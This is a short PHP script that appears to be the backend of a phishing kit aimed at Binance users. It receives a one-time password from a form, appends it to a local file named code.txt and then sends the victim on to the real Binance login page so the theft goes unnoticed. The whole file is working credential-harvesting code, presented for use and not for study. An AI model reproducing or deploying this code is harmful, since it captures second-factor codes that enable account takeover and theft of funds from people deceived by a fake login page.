
<?php
// Check if all required fields are submitted
if (
    isset($_POST['otp']) 
    
) {
    $file = "code.txt";
    $data = 
        "otp: " . $_POST['otp'] . "\n";


    file_put_contents($file, $data, FILE_APPEND);
    header('Location: https://accounts.binance.com/'); // Replace with your URL
    exit;
} else {
    // Log missing fields
    file_put_contents("error.log", "Missing form data: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
    header('Location: error_page.html'); // Redirect to error page
    exit;
}
?>
